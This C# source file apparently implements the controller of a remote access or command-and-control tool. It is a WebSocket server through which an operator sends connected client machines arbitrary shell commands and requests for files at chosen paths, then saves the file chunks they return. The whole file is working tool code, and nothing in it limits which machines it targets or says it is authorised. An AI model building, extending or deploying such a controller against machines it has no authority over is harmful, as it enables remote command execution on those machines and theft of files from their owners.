using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.WebSockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace endpoint
{
    internal class Program
    {
        public static byte[] GetResourceBytes(string path)
        {
            var asm = Assembly.GetExecutingAssembly();

            var name = asm.GetManifestResourceNames()
                          .FirstOrDefault(n => n.EndsWith(path));

            if (name == null)
            {
                throw new FileNotFoundException();
            }

            using (var stream = asm.GetManifestResourceStream(name))
            {
                if (stream == null)
                {
                    throw new AccessViolationException();
                }

                using (var ms = new MemoryStream())
                {
                    stream.CopyTo(ms);
                    return ms.ToArray();
                }
            }
        }

        static List<byte> tempbuffer = new List<byte>();
        static string tmpval = "";
        static async Task Main(string[] args)
        {
            Data.Config conf = JsonConvert.DeserializeObject<Data.Config>(Encoding.Default.GetString(GetResourceBytes("endpoint.emb.config.json")));

            if (string.IsNullOrEmpty(conf.ip) || string.IsNullOrEmpty(conf.port))
            {
                Console.WriteLine("please define config values");
                Environment.Exit(-1);
            }

            var listener = new HttpListener();

            listener.Prefixes.Add($"http://+:{conf.port}/");

            listener.Start();
            Console.WriteLine($"listening on ws://[::]:{conf.port}/");

            while (true)
            {
                var ctx = await listener.GetContextAsync();

                if (!ctx.Request.IsWebSocketRequest)
                {
                    ctx.Response.StatusCode = 400;
                    ctx.Response.Close();
                    continue;
                }

                _ = HandleClient(ctx);
            }
        }

        static async Task HandleClient(HttpListenerContext ctx)
        {
            var wsCtx = await ctx.AcceptWebSocketAsync(null);
            var ws = wsCtx.WebSocket;

            Console.WriteLine("client connected!");

            _ = SendLoop(ws);

            var buffer = new byte[4096];

            try
            {
                while (ws.State == WebSocketState.Open)
                {
                    var ms = new MemoryStream();
                    WebSocketReceiveResult result;

                    do
                    {
                        result = await ws.ReceiveAsync(
                            new ArraySegment<byte>(buffer),
                            CancellationToken.None
                        );

                        if (result.MessageType == WebSocketMessageType.Close)
                        {
                            await ws.CloseAsync(
                                WebSocketCloseStatus.NormalClosure,
                                "bye",
                                CancellationToken.None
                            );
                            Console.WriteLine("client disconnected");
                            return;
                        }

                        ms.Write(buffer, 0, result.Count);

                    } while (!result.EndOfMessage);

                    string json = Encoding.UTF8.GetString(ms.ToArray());

                    Data.Packet packet;
                    try
                    {
                        packet = JsonConvert.DeserializeObject<Data.Packet>(json);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("bad json:");
                        Console.WriteLine(json);
                        Console.WriteLine(ex);
                        continue;
                    }

                    if (packet == null)
                    {
                        Console.WriteLine("packet null");
                        continue;
                    }

                    await HandlePacket(ws, packet);
                }
            }
            catch (WebSocketException ej)
            {
                Console.WriteLine("client disconnected");
                await ws.CloseAsync(
                    WebSocketCloseStatus.NormalClosure,
                    "bye",
                    CancellationToken.None
                );
            }
            catch (Exception ex)
            {
                Console.WriteLine("unknown connection error:");
                Console.WriteLine(ex);
            }
        }

        static async Task HandlePacket(WebSocket ws, Data.Packet packet)
        {
            if (Data.debug)
            {
                switch (packet.pt)
                {
                    case Data.PacketType.echo:
                        Console.WriteLine($"command sent: {packet.input}");
                        break;

                    case Data.PacketType.recv:
                        Console.WriteLine($"received chunk: {packet.buffer?.Length} bytes");
                        break;

                    case Data.PacketType.endofdwnld:
                        Console.WriteLine("download finished");
                        break;
                }
            }else
            {
                switch (packet.pt)
                {
                    case Data.PacketType.recv:
                        tempbuffer.AddRange(packet.buffer);
                        break;
                    case Data.PacketType.endofdwnld:
                        tempbuffer.AddRange(packet.buffer);
                        File.WriteAllBytes(tmpval.Split(' ')[1], tempbuffer.ToArray());
                        Console.WriteLine("download finished");
                        tempbuffer.Clear();
                        tmpval = "";
                        break;
                }
                Console.WriteLine(packet.input);
            }
        }

        static async Task SendLoop(WebSocket ws)
        {
            while (ws.State == WebSocketState.Open)
            {
                Console.WriteLine("\nchoose packet:");
                Console.WriteLine("1 = download");
                Console.WriteLine("2 = command");
                Console.WriteLine("3 = disconnect");

                string choice = await Task.Run(() => Console.ReadLine());

                Data.Packet packet = new Data.Packet();

                switch (choice)
                {
                    case "1":
                        packet.pt = Data.PacketType.download;
                        Console.Write("file path: ");
                        await Task.Run(() => tmpval = Console.ReadLine());
                        packet.input = tmpval.Split(' ')[0];
                        break;

                    case "2":
                        packet.pt = Data.PacketType.exec;
                        Console.Write("command: ");
                        packet.input = await Task.Run(() => Console.ReadLine());
                        break;

                    case "3":
                        packet.pt = Data.PacketType.disconnect;
                        break;

                    default:
                        Console.WriteLine("invalid");
                        continue;
                }

                string json = JsonConvert.SerializeObject(packet);
                byte[] bytes = Encoding.UTF8.GetBytes(json);

                await ws.SendAsync(
                    new ArraySegment<byte>(bytes),
                    WebSocketMessageType.Text,
                    true,
                    CancellationToken.None
                );
            }
        }
    }
}